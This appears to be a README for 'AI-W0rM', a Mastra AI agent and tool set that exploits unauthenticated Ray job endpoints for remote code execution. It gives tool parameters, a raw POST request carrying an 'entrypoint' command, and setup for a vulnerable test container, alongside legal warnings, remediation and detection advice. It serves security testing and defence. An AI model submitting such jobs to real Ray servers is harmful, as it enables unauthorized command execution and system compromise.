# AI-W0rM Configuration Guide

## ⚠️ CRITICAL SECURITY WARNING ⚠️

**This tool is for AUTHORIZED SECURITY TESTING ONLY**

### Legal Notice

- **AUTHORIZATION REQUIRED**: You MUST have explicit written permission to test any target system
- **ILLEGAL WITHOUT AUTHORIZATION**: Unauthorized access to computer systems is a federal crime under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide
- **CRIMINAL PENALTIES**: Violators may face criminal prosecution, imprisonment, and substantial fines
- **CIVIL LIABILITY**: Unauthorized testing may result in civil lawsuits and damages

### Ethical Use Cases

✅ **AUTHORIZED USES:**
- Penetration testing on systems you own
- Security assessments with written authorization
- Educational purposes in isolated lab environments
- Bug bounty programs within defined scope
- Red team exercises with proper documentation

❌ **PROHIBITED USES:**
- Testing systems without explicit permission
- Unauthorized access to any computer system
- Malicious attacks or data theft
- Any illegal activity

---

## Overview

AI-W0rM is a security testing tool that exploits Remote Code Execution (RCE) vulnerabilities in Ray ML infrastructure. Ray is an open-source framework for distributed machine learning that, by default, lacks authentication on its job submission endpoints.

### What is Ray?

Ray is a popular open-source framework that provides:
- Distributed training of machine learning models
- Scalable compute from single machines to large clusters
- Web interface for job management
- **Default configuration: NO AUTHENTICATION** ⚠️

### The Vulnerability

**CVE References:**
- https://huntr.com/bounties/b507a6a0-c61a-4508-9101-fceb572b0385/
- https://huntr.com/bounties/787a07c0-5535-469f-8c53-3efa4e5717c7/

**Vulnerability Details:**
- **Type**: Remote Code Execution (RCE)
- **Severity**: CRITICAL
- **CVSS Score**: 9.8 (Critical)
- **Attack Vector**: Network
- **Authentication**: None Required
- **User Interaction**: None Required

**Affected Endpoints:**
- `/api/jobs/` (newer Ray versions)
- `/api/job_agent/jobs/` (older Ray versions)

**Impact:**
- Complete system compromise
- Arbitrary command execution
- Data exfiltration
- Lateral movement in networks
- Denial of service

---

## Installation

The AI-W0rM tool has been configured in this Mastra project.

### Dependencies Installed

```bash
npm install axios  # HTTP client for API requests
```

### Project Structure

```
src/mastra/
├── tools/
│   ├── ai-w0rm-tool.ts      # Exploit implementation
│   └── index.ts             # Tool exports
├── agents/
│   ├── ai-w0rm-agent.ts     # Security testing agent
│   └── index.ts             # Agent exports
└── index.ts                 # Mastra configuration
```

---

## Usage

### Starting the Mastra Server

```bash
npm run dev
```

This starts the Mastra development server with the AI-W0rM agent available.

### Available Tools

#### 1. `checkRayVulnerability`

Check if a Ray server is vulnerable without executing commands.

**Parameters:**
- `targetHost` (string, required): Target hostname or IP
- `targetPort` (number, default: 8265): Target port
- `useSSL` (boolean, default: false): Use HTTPS
- `timeout` (number, default: 5000): Request timeout in ms

**Example:**
```typescript
{
  "targetHost": "192.168.1.100",
  "targetPort": 8265,
  "useSSL": false
}
```

**Response:**
```json
{
  "vulnerable": true,
  "accessible": true,
  "endpoints": [
    {
      "url": "http://192.168.1.100:8265/api/jobs/",
      "available": true
    }
  ],
  "message": "⚠️ Target is VULNERABLE - Ray job submission endpoints are accessible without authentication"
}
```

#### 2. `aiW0rmTool`

Execute commands on vulnerable Ray servers (AUTHORIZED ONLY).

**Parameters:**
- `targetHost` (string, required): Target hostname or IP
- `targetPort` (number, default: 8265): Target port
- `command` (string, required): Command to execute
- `useSSL` (boolean, default: false): Use HTTPS
- `timeout` (number, default: 10000): Request timeout in ms

**Example:**
```typescript
{
  "targetHost": "192.168.1.100",
  "targetPort": 8265,
  "command": "whoami",
  "useSSL": false
}
```

**Response:**
```json
{
  "success": true,
  "jobId": "raysubmit_abc123",
  "submissionId": "raysubmit_xyz789",
  "endpoint": "http://192.168.1.100:8265/api/jobs/",
  "message": "Command executed successfully. Job ID: raysubmit_abc123, Submission ID: raysubmit_xyz789"
}
```

---

## Testing Workflow

### 1. Set Up a Vulnerable Test Environment

**Using Docker (SAFE - for testing only):**

```bash
# Pull vulnerable Ray version
docker pull rayproject/ray:2.6.3

# Run Ray container
docker run --shm-size=512M -it -p 8265:8265 rayproject/ray:2.6.3

# Inside container, start Ray
ray start --head --dashboard-host=0.0.0.0
```

**⚠️ WARNING**: Only run this in isolated lab environments, never on production networks!

### 2. Verify Vulnerability

```bash
# Check if Ray is vulnerable
curl http://localhost:8265/api/jobs/
```

If you get a response (not 404), the endpoint is accessible.

### 3. Use AI-W0rM Agent

Interact with the Mastra agent to:
1. Check vulnerability status
2. Execute test commands (with authorization)
3. Document findings
4. Get remediation recommendations

---

## Security Best Practices

### For Security Testers

1. **Always Get Authorization**
   - Obtain written permission before testing
   - Define clear scope and boundaries
   - Document all activities
   - Report findings responsibly

2. **Use Safely**
   - Test only in isolated environments
   - Never test production systems without approval
   - Use non-destructive commands first
   - Have a rollback plan

3. **Document Everything**
   - Record all commands executed
   - Capture screenshots and logs
   - Note timestamps
   - Document impact assessment

### For System Administrators

#### Remediation Steps

1. **Enable Authentication**
   ```bash
   # Use Ray's authentication features
   ray start --head --dashboard-host=0.0.0.0 --dashboard-port=8265 \
     --include-dashboard=true --dashboard-agent-listen-port=52365
   ```

2. **Network Segmentation**
   - Restrict access to Ray ports (8265, 10001, 6379)
   - Use firewall rules
   - Implement VPN access
   - Use network policies in Kubernetes

3. **Monitoring**
   - Monitor Ray job submissions
   - Set up alerts for unusual activity
   - Log all API access
   - Review logs regularly

4. **Update Ray**
   ```bash
   pip install --upgrade ray
   ```

5. **Use Ray Security Features**
   - Enable TLS/SSL
   - Configure authentication
   - Use Ray's security best practices
   - Review Ray security documentation

#### Detection

**Signs of Exploitation:**
- Unexpected job submissions
- Unknown processes running
- Unusual network traffic
- Suspicious commands in Ray logs
- Unauthorized access attempts

**Log Locations:**
- Ray logs: `/tmp/ray/session_*/logs/`
- Dashboard logs: Check Ray dashboard UI
- System logs: `/var/log/syslog` or `/var/log/messages`

---

## Technical Details

### How the Exploit Works

1. **Discovery**: Attacker identifies Ray server (port 8265)
2. **Reconnaissance**: Checks if job submission endpoints are accessible
3. **Exploitation**: Sends POST request with malicious command
4. **Execution**: Ray executes command without authentication
5. **Impact**: Attacker gains code execution on server

### Exploit Code Flow

```
Client → POST /api/jobs/ → Ray Server
         {
           "entrypoint": "malicious_command"
         }
         
Ray Server → Executes command → Returns job_id
```

### Network Traffic

```http
POST /api/jobs/ HTTP/1.1
Host: target:8265
Content-Type: application/json

{
  "entrypoint": "whoami"
}
```

Response:
```json
{
  "job_id": "raysubmit_abc123",
  "submission_id": "raysubmit_xyz789"
}
```

---

## References

### Research & Disclosure

- **Protect AI**: https://protectai.com
- **Huntr Bug Bounty**: https://huntr.com
- **Original Research**: Sierra Bearchell, Dan McInerney
- **AI Exploits Repository**: https://github.com/protectai/ai-exploits

### Ray Security

- **Ray Documentation**: https://docs.ray.io/
- **Ray Security Guide**: https://docs.ray.io/en/latest/ray-security/index.html
- **Ray GitHub**: https://github.com/ray-project/ray

### Legal & Compliance

- **Computer Fraud and Abuse Act (CFAA)**: https://www.justice.gov/jm/jm-9-48000-computer-fraud
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework

---

## Disclaimer

This tool is provided for educational and authorized security testing purposes only. The authors and contributors:

- Do NOT condone illegal activity
- Are NOT responsible for misuse of this tool
- Assume NO liability for damages caused by use of this tool
- Strongly advocate for responsible disclosure and ethical security research

**USE AT YOUR OWN RISK AND ONLY WITH PROPER AUTHORIZATION**

---

## Support & Contribution

For questions, issues, or contributions related to this implementation:

1. Review the code in `src/mastra/tools/ai-w0rm-tool.ts`
2. Check the agent configuration in `src/mastra/agents/ai-w0rm-agent.ts`
3. Consult the original ai-exploits repository for updates

---

## License

This implementation follows the Apache 2.0 License, consistent with the original ai-exploits repository.

**Remember: With great power comes great responsibility. Use ethically and legally.**
